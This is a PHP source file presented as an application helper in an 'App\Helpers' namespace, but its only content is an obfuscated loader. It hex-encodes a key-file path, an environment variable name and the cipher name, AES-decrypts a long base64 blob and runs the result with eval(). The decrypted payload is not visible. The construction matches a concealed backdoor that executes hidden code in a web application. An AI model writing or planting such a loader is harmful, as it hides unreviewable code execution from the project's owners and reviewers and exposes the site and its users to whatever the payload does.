<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('AW4gkL5za0XykrNEs9uxbg==');
$c=base64_decode(
'le+Yd/c/czCxOPZxo2wY67J9zJqil+OayiVPAgHTBsM1ZZMlsK4io3alK7hiYqxZFjn/EI5XLCEH' .
'YuG60e1wtV9dqZqMh4MaDpWSpVS692YxfJreFxK3hh4eFAgH02qL7HKgM8zNzO4BVY4PY1BvsSHR' .
'k/2eDHvCNmSSZhnrJ5NTYDwYGJspAgw42fvTtWq7Y5ihF/+beIYt//6r4DxrWBeDTxxDPNkfed0f' .
'deTfkRP8vg1y4iGwVel6oLPEgbHPve0elVhWQeUOqsxD1/xnd3Ovu2Ji9aWjVNxpLBSHrwD19Mwg' .
'X45+XS3fnoCurB6wFtaMrTIUhu8eoz93gwE1ibbRW9b43ulDgIL9ULqLNpaRQO7AUep3Ya385141' .
'hg+LH9BBNl/sMvNAChYyZsbwstz+afqzUh6M2yoSPivcZutut8RN7V3VH3Ut9Jk/Y9gMhxqGbix2' .
'5tQmAJz16bG4qL5DGyhDb4DmaXxDia+g6XHrtyTIXQzQooiehH8oPD3FW8HpOmiINdgl6hS5ueXN' .
'zKjIINUsgCjjlG1gZldm2fSktPiVdlTWX/uHznjIh1rWF2riIKRCReCTNr48P4f2rFA8uOh8GLIL' .
'RQJIxwKH+6U7USbNY8a609WUK6CTvuJVRw5KRqlnyk+UrPH1O11PgN78QBd4SLXPNbGgZg34sMin' .
'7RtmuhYlZzlu+OmJInO5hAIsHQp/IiDB+T0JVyrDu6y6/SsmTQ9R1oWvCyDHnyjxNFJzDFLkvtG9' .
'L74jToaYkdbAaFGiwB+s9DKL/ftq1GqgFaEQdR5aWEDfVsgKIhBfrmqd3qPhZNS8BCJyaT1/h4bz' .
'ZbQZNXcdZcZscu36jD5/l33VFwTGAFZsQQjxnVSb6pzzL67UfmeF7Uvj7GI1lOhhFh90capeSxiJ' .
'Dv0aLax/41lpC3qF8OgWzAp3H848YgtF5ciUBa7KOPscpiGbmNpOXbSV0IJ42OkcDawkhvzygOF6' .
'X/WCMyyNrX8I6DK7gsQqWZY1NQZ0c3/4YoVv/BrEuuf7GKU6a9WN28XxdmGXBMxoU9WAPUrNbeNn' .
'iePiGsiGOIo4MEdoxlXMKu/tLYQgPKs5fvtScGttHo6BtE+IK0lWmIr5v2hBLd+mfH9UFwA4Akia' .
'6WELd2HfIbtLi7FKvfwwxKPDXqpWK8soA/4o/5uvN6+D6GiwVClwp58FUY8O87En9xV4w9ys1BDi' .
'/udrJyr/SKxu0RobofrpEpmyrUs4Axu0abQpEK187+kv8j6y209idnI7L5P2CEDPQWo4WSIPh2zu' .
'TYL+Fch8ubHdthx0U+/8TIoO7ZJaUFrTOdsxYJn91lKvikWX2Q+52V5ja2JU9Cf5eZTp3/Fex4Z+' .
'buR8RMZSqr4w8E5diB9D90IFLagGHUYmeArH9eocNfdsg8sUyyPO6U2169/p52FmZhi9VSVpq3cZ' .
'RIvSTIu0AIeaP1i5fcwX/FASmijS1bdqempBIBOqxakNgyaC7ROtFLGi4REMP63gQsTAsGLlAQGF' .
'0CTlLHfzP22i2Rm9iZjr20mTZaWOAofIG56ag1/ZtqmWzYHYw0pT7mCtYwUtiXNNJKtSRo0MMtYn' .
't4r+fJ8pF4e+iota+/bdGa2yeY3Bxx6KKx11OljqBYQvxT5yw4dAF7ffW14payoO/8x12pMP49yU' .
'4qgRpjQIVlCIBszMHxoGpW4BRMpS6GVG9Rcp/XxYUbIDf760V4NZr+suwGJvgszlr5AaI2IqsewZ' .
'QBZH0Qwd6Q2bRRFFQTs+0XgglqiqarschfJ2wCAv811yZOhBKd/neNlEZ9vT0vKIqKhjAB//d8l/' .
'/6s5hlqERB3htSXfhOr22ZVjmSldzhjd1GG8Hb+HzJKJD7utdS+qygEPVA6NZepubvTOaxS1Hs7j' .
'3C3D48N/LceAjHKDoTpapHr1n5KnAQmz5AYZVFu/ZgXU8G9LpbO7/pF6eCYkX8Bf5UMr9cUFpQJL' .
'J3dusURx9HzJ8JIECbtJmdpd/0/4KJcIMh499ccovv8aHJWdRlql08xo8oTMpro6ODdMfBf6P7q/' .
'fiG72nWQO78/mxO2klHht9xoH9/DTz0XG4AmV+iaK8T2ZvkA3/UpXlKRANF8RpSLRLM8YZiz+4Vq' .
'aCJTYzVifgJ9hbwAUsrUbpGw1asYJNtrmfHgPoEvhwKFheVd'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
